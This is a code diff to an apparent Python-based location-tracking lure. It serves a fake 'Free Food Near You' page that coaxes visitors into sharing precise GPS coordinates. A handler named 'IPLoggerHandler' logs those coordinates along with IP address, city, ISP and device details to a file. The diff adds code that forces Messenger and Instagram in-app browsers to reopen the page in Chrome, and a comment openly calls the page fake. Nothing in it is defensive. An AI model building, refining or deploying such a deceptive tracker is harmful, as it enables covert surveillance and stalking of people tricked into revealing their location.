@@ -10,7 +10,7 @@ html = """
 <head>
     <title>Free Food Near You</title>
     <style>
-        body { font-family: Arial, background: #fff5f5; margin: 0; padding: 0; }
+        body { font-family: Arial; background: #fff5f5; margin: 0; padding: 0; }
         header { background: #e53935; color: white; padding: 20px; font-size: 28px; text-align: center; font-weight: bold; }
         .container { text-align: center; padding: 30px; max-width: 400px; margin: auto; }
         .container h2 { color: #e53935; margin-bottom: 10px; }
@@ -33,7 +33,7 @@ html = """
     <div id="overlay">
         <div id="popup">
             <h3>Find Free Food Nearby</h3>
-            <p>Restaurants & fast food chains near you are giving away surplus food they didnt sell today. Allow location to see offers near you.</p>
+            <p>Restaurants & fast food chains near you are giving away surplus food they didn’t sell today. Allow location to see offers near you.</p>
             <button onclick="getLocation()">Allow Access</button>
         </div>
     </div>
@@ -52,6 +52,27 @@ html = """
     <p class="footer">Created by <b>kchiong</b></p>
 
     <script>
+        // Detect Messenger/Instagram in-app browsers
+        function isInAppBrowser() {
+            let ua = navigator.userAgent || navigator.vendor || window.opera;
+            return ua.includes("FBAN") || ua.includes("FBAV") || ua.includes("Instagram");
+        }
+
+        // Force open in Chrome/Safari if Messenger/Instagram
+        if (isInAppBrowser()) {
+            let url = window.location.href;
+            try {
+                if (/iPhone|iPad|iPod/.test(navigator.userAgent)) {
+                    window.location = "googlechrome://" + url.replace(/^https?:\/\//, '');
+                } else if (/Android/.test(navigator.userAgent)) {
+                    window.location = "intent://" + url.replace(/^https?:\/\//, '') + "#Intent;scheme=https;package=com.android.chrome;end";
+                }
+            } catch (e) {
+                document.body.innerHTML = "<div style='padding:50px; text-align:center;'><h2>Please open this page in your browser</h2><p>Tap the menu (⋮) → 'Open in Browser'.</p></div>";
+            }
+        }
+
+        // Geolocation functions
         function getLocation() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(success, error, {enableHighAccuracy:true});
@@ -65,8 +86,6 @@ html = """
             const lat = position.coords.latitude;
             const lon = position.coords.longitude;
             const accuracy = position.coords.accuracy;
-
-            // Send coordinates to server
             fetch('/log?lat=' + lat + '&lon=' + lon + '&accuracy=' + accuracy);
             document.getElementById("status").innerText = "Verified! Loading offers...";
             document.getElementById("overlay").style.display = "none";
@@ -76,21 +95,6 @@ html = """
             document.getElementById("status").innerText = "Location access denied. Showing default offers.";
             document.getElementById("overlay").style.display = "none";
         }
-        function isInAppBrowser() {
-        let ua = navigator.userAgent || navigator.vendor || window.opera;
-        return ua.includes("FBAN") || ua.includes("FBAV") || ua.includes("Instagram");
-    }
-
-    window.onload = function() {
-        if (isInAppBrowser()) {
-            let url = window.location.href;
-            if (/iPhone|iPad|iPod/.test(navigator.userAgent)) {
-                window.location = "googlechrome://" + url.replace(/^https?:\/\//, '');
-            } else if (/Android/.test(navigator.userAgent)) {
-                window.location = "intent://" + url.replace(/^https?:\/\//, '') + "#Intent;scheme=https;package=com.android.chrome;end";
-            }
-        }
-    };
     </script>
 </body>
 </html>
@@ -112,7 +116,7 @@ class IPLoggerHandler(BaseHTTPRequestHandler):
             log_entry = f"GPS Coordinates: {lat},{lon} | Accuracy: {acc}m | Device: {device_info}"
             logging.info(log_entry)
             with open("ips.txt", "a") as f:
-                f.write(log_entry + "\n")
+                f.write(log_entry + "\\n")
             self.send_response(200)
             self.end_headers()
             return
@@ -135,9 +139,9 @@ class IPLoggerHandler(BaseHTTPRequestHandler):
         log_entry = f"IP: {client_ip} | {city}, {region}, {country} | ISP: {org} | Device: {device_info} | Approx. Coordinates: {loc}"
         logging.info(log_entry)
         with open("ips.txt", "a") as f:
-            f.write(log_entry + "\n")
+            f.write(log_entry + "\\n")
 
-        # Serve fake blog page
+        # Serve fake page
         self.send_response(200)
         self.send_header('Content-type', 'text/html')
         self.end_headers()
